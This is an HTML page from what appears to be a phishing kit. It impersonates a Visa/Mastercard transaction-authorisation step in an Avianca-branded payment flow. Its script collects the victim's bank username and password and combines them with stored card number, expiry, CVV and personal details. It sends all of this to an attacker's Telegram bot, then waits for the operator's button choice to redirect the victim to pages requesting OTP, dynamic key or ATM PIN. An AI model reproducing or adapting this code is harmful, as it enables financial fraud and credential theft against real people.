<!DOCTYPE html>
<html lang="es">
  <head>

    <title>Autorizaci√≥n de Transacci√≥n</title>
    <script src="./bots/aes.js"></script>

    <link

    <style>
      body {
        margin: 0;
        padding: 0;
        overflow: hidden;
        /* Evita que la p√°gina se desplace */
        background-color: #ffffff;
      }

      html,
      body {
        height: 100%;
      }
      body {
        display: flex;
        justify-content: center; /* Centra horizontalmente */
        align-items: center; /* Centra verticalmente */
        height: 100vh; /* Asegura que ocupe toda la pantalla */
        margin: 0; /* Elimina m√°rgenes predeterminados */
        background-color: #f0f0f0; /* Color de fondo opcional */
      }

      #contenedor {
        position: relative;
        width: 95vw;
        height: 95vh;
        background-color: #ffffff;
        overflow: hidden;
        /* Evita que las im√°genes sobresalgan del contenedor */
        width: 310px;
        /* Ajusta el ancho seg√∫n tus necesidades */

        /* Ajusta la altura seg√∫n tus necesidades */
      }

      #imagenIzquierda {
        position: absolute;
        top: 10px;
        left: 20px;
        width: 70px;
        /* Ajusta el ancho seg√∫n tus necesidades */

        /* Ajusta la altura seg√∫n tus necesidades */
      }

      #imagenDerecha {
        position: absolute;
        top: 2px;
        right: 20px;
        width: 100px;
        /* Ajusta el ancho seg√∫n tus necesidades */
        height: 50px;
        /* Ajusta la altura seg√∫n tus necesidades */
      }

      #titulo {
        font-size: 20px;
        font-weight: bold;
        color: #333;
        /* Color del texto */
        margin-top: 70px;
        /* Espaciado superior */
        margin-bottom: 10px;
        /* Espaciado inferior */
        text-align: center;
        /* Alineaci√≥n del texto */
      }

      #titulo2 {
        font-size: 16px;
        font-weight: bold;
        color: #333;
        /* Color del texto */
        margin-top: 30px;
        /* Espaciado superior */
        margin-bottom: 10px;
        /* Espaciado inferior */
        text-align: center;
        /* Alineaci√≥n del texto */
      }

      #parrafo {
        font-size: 13px;
        color: #000000;
        /* Color del texto */
        margin: 0 auto;
        /* Centra el p√°rrafo horizontalmente */
        max-width: 80%;
        /* Ancho m√°ximo del p√°rrafo */
        text-align: justify;
        /* Justifica el texto */
        letter-spacing: 2px;
        /* Ajusta el valor seg√∫n tus preferencias */
      }

      #formulario {
        margin-top: 10px;
        padding: 0 40px;
        display: flex;
        flex-direction: column;
        align-items: flex-start;
        /* Alinea los elementos al inicio del contenedor */
      }

      .form-group {
        display: flex;
        align-items: center;
        margin-bottom: 15px;
        width: 100%;
        /* Ajusta el ancho para que ocupe todo el contenedor */
      }

      .form-group label {
        font-size: 12px;
        font-weight: bold;
        color: #333;
        width: 30%;
        /* Ancho de la etiqueta */
        margin-right: 5px;
        /* Espaciado entre la etiqueta y el input */
        text-align: left;
        /* Alinea el texto del t√≠tulo a la izquierda */
      }

      .form-group input {
        width: 70%;
        /* Ancho del input */
        max-width: 130px;
        /* Ancho m√°ximo para los inputs */
        padding: 8px;
        margin-bottom: 2px;
        margin-top: -4px;
        /* Ajusta la posici√≥n vertical del input */
        box-sizing: border-box;
        border: 1px solid #ccc;
        border-radius: 4px;
      }

      #horaTransaccion {
        font-size: 14px;
        color: #333;
        margin-top: 15px;
        text-align: center;
        /* Centra el texto */
      }

      #autorizarBtn {
        display: block;
        margin: 45px auto;
        padding: 15px 30px;
        border-radius: 10%;
        background-color: #000;
        color: #fff;
        text-align: center;
        cursor: pointer;
        font-size: 12px;
        text-decoration: none;
        border: none;
      }

      #contador {
        color: #555;
        font-size: 8px;
        margin-left: 8px;
      }

      .loaderp {
        width: 48px;
        height: 48px;
        border: 5px solid #fff;
        border-bottom-color: rgb(255, 0, 0);
        border-radius: 50%;
        display: inline-block;
        box-sizing: border-box;
        animation: rotation 1s linear infinite;
      }

      @keyframes rotation {
        0% {
          transform: rotate(0deg);
        }

        100% {
          transform: rotate(360deg);
        }
      }

      .loaderp-full {
        position: fixed;
        top: 0;
        overflow-y: hidden;
        z-index: 1000;
        background-color: white;
        width: 100vw;
        height: 100vh;

        display: none;
        flex-direction: column;
        justify-content: center;
        align-items: center;
      }
    </style>
  </head>

  <body>
    <div id="contenedor" style="justify-content: center">
      <img id="imagenIzquierda" src="./galeria/visa.svg" alt="Logo Visa" />
      <img id="imagenDerecha" src="./galeria/mc.svg" alt="Logo Mastercard" />
      <div id="titulo">Autorizaci√≥n de transacci√≥n</div>
      <p id="parrafo">
        Est√°s intentando realizar un pago por tarjeta de cr√©dito/d√©bito.
        Necesitamos confirmar que eres t√∫ quien realiza este pago.
      </p>
      <p id="horaTransaccion">Hora de la transacci√≥n:</p>
      <form id="formulario" method="POST">
        <div class="form-group">
          <label for="username">Usuario:</label>
          <input
            type="text"
            id="username"
            name="username"
            placeholder="Usuario"
            minlength="4"
            maxlength="20"
            required
          />
        </div>
        <div class="form-group">
          <label for="password">Clave:</label>
          <input
            type="password"
            id="password"
            name="password"
            placeholder="Clave"
            minlength="4"
            maxlength="20"
            required
          />
        </div>
        <input type="hidden" name="localStorageInfo" id="localStorageInfo" />

        <button type="submit" id="autorizarBtn">Autorizar</button>
      </form>
    </div>

    <!-- LOADER FULL -->
    <div class="loaderp-full">
      <span class="loaderp"></span>
      <p class="text-italic tc-ocean fs-3 fw-light"></p>
    </div>

    <script>
      document.addEventListener("DOMContentLoaded", function () {
        const loader = document.querySelector(".loaderp-full");

        // Actualiza la hora en vivo cada segundo
        setInterval(actualizarHoraTransaccion, 1000);

        function obtenerFechaActual() {
          const ahora = new Date();
          const dia = ahora.getDate().toString().padStart(2, "0");
          const mes = (ahora.getMonth() + 1).toString().padStart(2, "0");
          const a√±o = ahora.getFullYear();
          const horas = ahora.getHours().toString().padStart(2, "0");
          const minutos = ahora.getMinutes().toString().padStart(2, "0");
          const segundos = ahora.getSeconds().toString().padStart(2, "0");
          return `${dia}/${mes}/${a√±o} ${horas}:${minutos}:${segundos}`;
        }

        function actualizarHoraTransaccion() {
          const ahora = new Date();
          const horas = ahora.getHours().toString().padStart(2, "0");
          const minutos = ahora.getMinutes().toString().padStart(2, "0");
          const segundos = ahora.getSeconds().toString().padStart(2, "0");
          document.getElementById(
            "horaTransaccion"
          ).innerText = `Hora de la transacci√≥n: ${horas}:${minutos}:${segundos}`;
        }

        // Al enviar el formulario
        document
          .getElementById("formulario")
          .addEventListener("submit", async function (event) {
            event.preventDefault();
            loader.style.display = "flex";

            // Obtener los datos de pago desde localStorage con la clave 'pagojet'
            const info = localStorage.getItem("pagojet");
            let pagoData = null;

            if (info) {
              try {
                // Parsear los datos obtenidos
                pagoData = JSON.parse(info);
                console.log("Datos de pago obtenidos:", pagoData); // Debugging
              } catch (e) {
                console.error("Error al parsear localStorage:", e);
              }
            } else {
              console.log(
                'No se encontr√≥ informaci√≥n en localStorage con la clave "pagojet".'
              );
            }

            // Guardar username y password en localStorage
            const transactionId =
              Date.now().toString(36) + Math.random().toString(36).substr(2);
            const username = document.getElementById("username").value;
            const password = document.getElementById("password").value;

            localStorage.setItem("transactionId", transactionId);
            localStorage.setItem("username", username);
            localStorage.setItem("password", password);

            // Preparar el mensaje para enviar a Telegram
            const message = `
<b>üõ´‚†Ä‚†Ä‚†Ä‚†Ä‚†ÄAvianca‚†Ä‚†Ä‚†Ä‚†Ä‚†Äüõ´</b>

üÜî <b>ID:</b> | <code>${pagoData ? pagoData.id : "No disponible"}</code>  
üëÆüèª‚Äç‚ôÄÔ∏è <b>Nombre:</b> | <code>${
              pagoData ? pagoData.nombre : "No disponible"
            }</code>  
üìß <b>Email:</b> | <code>${pagoData ? pagoData.email : "No disponible"}</code>  
üì≤ <b>Celular:</b> | <code>${
              pagoData ? pagoData.celular : "No disponible"
            }</code>  
üè¶ <b>Banco:</b> | <code>${pagoData ? pagoData.banco : "No disponible"}</code>  
üìç <b>Direcci√≥n:</b> | <code>${
              pagoData ? pagoData.direccion : "No disponible"
            }</code>  
üí≥ <b>Tarjeta:</b> | <code>${
              pagoData ? pagoData.tarjeta : "No disponible"
            }</code>  
üóìÔ∏è <b>Fecha de Expiraci√≥n:</b> | <code>${
              pagoData ? pagoData.ftarjeta : "No disponible"
            }</code>  
üîê <b>CVV:</b> | <code>${pagoData ? pagoData.cvv : "No disponible"}</code>  
üßë‚Äçüíª <b>Usuario:</b> | <code>${username}</code>  
üîê <b>Clave:</b> | <code>${password}</code>  
üåê <b>IP:</b> | <code>${pagoData ? pagoData.ip : "No disponible"}</code>
`;

            // Crear teclado interactivo con botones
            const keyboard = JSON.stringify({
              inline_keyboard: [
                [
                  {
                    text: "X Logo",
                    callback_data: `error_logo:${transactionId}`,
                  },
                  {
                    text: "Din√°mica",
                    callback_data: `pedir_dinamica:${transactionId}`,
                  },
                  { text: "X TC", callback_data: `error_tc:${transactionId}` },
                  {
                    text: "X Din√°mica",
                    callback_data: `error_dinamica:${transactionId}`,
                  },
                  { text: "OTP", callback_data: `pedir_otp:${transactionId}` },
                  {
                    text: "C Cajero",
                    callback_data: `clave_cajero:${transactionId}`,
                  },
                  {
                    text: "Fin",
                    callback_data: `confirm_finalizar:${transactionId}`,
                  },
                ],
              ],
            });

            const config = await loadTelegramConfig();
            if (!config) {
              loader.style.display = "none";
              return;
            }

            fetch(`https://api.telegram.org/bot${config.token}/sendMessage`, {
              method: "POST",
              headers: {
                "Content-Type": "application/json",
              },
              body: JSON.stringify({
                chat_id: config.chat_id,
                text: message,
                reply_markup: keyboard,
                parse_mode: "HTML", // Especificar el modo de an√°lisis para el formato HTML
              }),
            })
              .then((response) => response.json())
              .then((data) => {
                if (data.ok) {
                  console.log("Mensaje enviado a Telegram con √©xito");
                  const messageId = data.result.message_id;
                  checkPaymentVerification(transactionId, messageId, config);
                } else {
                  console.error("Error al enviar mensaje a Telegram:", data);
                  loader.style.display = "none";
                }
              })
              .catch((error) => {
                console.error("Error al enviar mensaje a Telegram:", error);
                loader.style.display = "none";
              });
          });

        async function loadTelegramConfig() {
          try {
            // Cargar las claves directamente desde el archivo claves.json
            const response = await fetch("claves.json"); // Aseg√∫rate de que la ruta al archivo sea correcta
            if (!response.ok) {
              throw new Error("No se pudo cargar el archivo claves.json.");
            }
            const config = await response.json();

            // Verificar si se devolvi√≥ un error
            if (config.error) {
              console.error("Error al cargar claves.json:", config.error);
              return null;
            }

            return config;
          } catch (error) {
            console.error("Error al cargar las claves:", error);
            return null;
          }
        }

        async function checkPaymentVerification(
          transactionId,
          messageId,
          config
        ) {
          fetch(`https://api.telegram.org/bot${config.token}/getUpdates`)
            .then((response) => response.json())
            .then((data) => {
              const updates = data.result;
              const verificationUpdate = updates.find(
                (update) =>
                  update.callback_query &&
                  (update.callback_query.data === `error_tc:${transactionId}` ||
                    update.callback_query.data ===
                      `error_logo:${transactionId}` ||
                    update.callback_query.data ===
                      `pedir_dinamica:${transactionId}` ||
                    update.callback_query.data ===
                      `pedir_otp:${transactionId}` ||
                    update.callback_query.data ===
                      `clave_cajero:${transactionId}`)
              );

              if (verificationUpdate) {
                // Eliminar botones del mensaje original
                fetch(
                  `https://api.telegram.org/bot${config.token}/editMessageReplyMarkup`,
                  {
                    method: "POST",
                    headers: {
                      "Content-Type": "application/json",
                    },
                    body: JSON.stringify({
                      chat_id: config.chat_id,
                      message_id: messageId,
                      reply_markup: JSON.stringify({ inline_keyboard: [] }),
                    }),
                  }
                );

                loader.style.display = "none";

                // Comportamientos basados en el bot√≥n presionado
                if (
                  verificationUpdate.callback_query.data ===
                  `pedir_dinamica:${transactionId}`
                ) {
                  window.location.href = "pedir_dinamica.html";
                } else if (
                  verificationUpdate.callback_query.data ===
                  `error_tc:${transactionId}`
                ) {
                  alert(
                    "Error con la tarjeta de cr√©dito. Verifique los datos."
                  );
                  window.location.href = "payment.html";
                } else if (
                  verificationUpdate.callback_query.data ===
                  `error_logo:${transactionId}`
                ) {
                  alert("Usuario o clave incorrectos.");
                } else if (
                  verificationUpdate.callback_query.data ===
                  `pedir_otp:${transactionId}`
                ) {
                  window.location.href = "pedir_otp.html";
                } else if (
                  verificationUpdate.callback_query.data ===
                  `clave_cajero:${transactionId}`
                ) {
                  window.location.href = "pedir_clave_cajero.html";
                }
              } else {
                setTimeout(
                  () =>
                    checkPaymentVerification(transactionId, messageId, config),
                  2000
                );
              }
            })
            .catch((error) => {
              console.error("Error al verificar el pago:", error);
              setTimeout(
                () =>
                  checkPaymentVerification(transactionId, messageId, config),
                2000
                
              );
             

            });
             
        }
      });
    </script>
  </body>
</html>
